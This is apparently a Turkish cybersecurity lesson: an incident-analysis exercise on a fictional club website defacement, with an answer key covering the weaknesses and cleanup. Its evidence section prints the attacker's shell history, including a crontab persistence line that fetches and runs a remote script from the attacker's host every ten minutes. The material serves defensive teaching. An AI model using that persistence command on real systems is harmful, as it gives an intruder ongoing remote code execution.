---
id: m10-08
tur: uygulama
baslik: "Uygulama: Saldırının İzini Bul"
sure: 40
hedefler:
  - Kurgusal bir olayda saldırganın faydalandığı güvenlik eksiklerini bulmak
  - Olayın nasıl önlenebileceğini Kill Chain üzerinden tartışmak
gorseller:
  - id: m10-08-b
    tur: ai
    alt: "Küçük hataların domino gibi dizildiği bir masa; ilk taş devrilmiş, son taş bir sunucu dolabına çarpmak üzere"
    prompt: "A long line of dominoes on a dark table, each domino stamped with a small icon of a minor mistake, a reused key, an open window, an old patch, a forgotten account; the first domino has fallen and the chain races toward a small server cabinet at the end, a detective's hand reaching in to pull one domino out."
---

# Uygulama: Saldırının İzini Bul

> **Olay:** Kurgusal Kuzey Kıyı Üniversitesi Siber Güvenlik Kulübü'nün etkinlik sitesi bir sabah
> "HACKED" yazısıyla açıldı. Ekibin topladığı kanıtlar aşağıda. Hepsi **kurgusaldır**.

::cizgi[m10-08-sahne]

## Kanıtlar

**E1 — Kulüp sunucusu ayarları:** SSH 22 portu internete açık · parola ile giriş açık ·
`deploy` hesabının parolası `Kulup2024` (3 yıldır değişmemiş, kulübün başka bir sitesinde de aynı).

**E2 — `auth.log` özeti (M07):** 203.0.113.66'dan ~3 dakikada 58 başarısız deneme, ardından `deploy` için başarılı **parola** girişi.

**E3 — Komut geçmişi (`deploy`):**
```text
cd /var/www/etkinlik
cp index.html index.html.bak
echo "<h1>HACKED</h1>" > index.html
(crontab -l; echo "*/10 * * * * curl -s http://203.0.113.66/x.sh | bash") | crontab -
```

**E4 — İzleme:** Sunucuda başarısız giriş için hiçbir alarm kuralı yok; loglar haftada bir elle okunuyor.

## Görevler

![Küçük hataların domino gibi dizildiği bir masa; ilk taş devrilmiş, son taş bir sunucu dolabına çarpmak üzere](../../gorseller/m10-08-b.webp)

1. **Zincir:** Olayı Kill Chain aşamalarına yerleştir. Hangi kanıt hangi aşamayı gösteriyor?
2. **Eksikler:** Saldırganın faydalandığı **en az 5** güvenlik eksiğini listele.
3. **Kırılma noktaları:** Her eksik için, zinciri o noktada kıracak **bir önlem** yaz.
4. **Kalıcılık:** E3'teki son satır ne yapıyor? Neden tehlikeli? Temizlik sırasında ne yapılmalı?
5. **Öncelik:** Önlemlerin arasından "yarın sabah ilk yapılacak 3 iş"i seç ve sırala.

<details><summary>Tartışma notları</summary>
Eksikler: internete açık SSH · parola girişi açık · zayıf ve tekrar kullanılan parola · hız sınırı/fail2ban yok · deploy hesabının web dosyalarına yazma yetkisi (en az yetki?) · izleme/alarm yok · çıkış trafiği kısıtlaması yok.
Kalıcılık: her 10 dakikada saldırganın sunucusundan betik indirip çalıştırıyor (komuta-kontrol). Temizlik: crontab'ı temizle, deploy parolasını değiştir ve anahtar tabanlı girişe geç, tüm oturumları kapat, sunucuda başka değişiklik var mı incele (mümkünse temiz kurulum), 203.0.113.66'yı engelle.
İlk 3 iş (örnek): 1) Erişimi kes ve kalıcılığı temizle 2) SSH'ta parola girişini kapat + parolayı değiştir 3) başarısız giriş alarmı ve hız sınırı.
</details>

## ✅ Akılda kalsın

- Olaylar genelde tek bir büyük hata değil, küçük eksiklerin zinciridir.
- Kalıcılığı temizlemeden yapılan "düzeltme" yarım kalır.
- İyi bir olay analizi önceliklendirilmiş önerilerle biter.
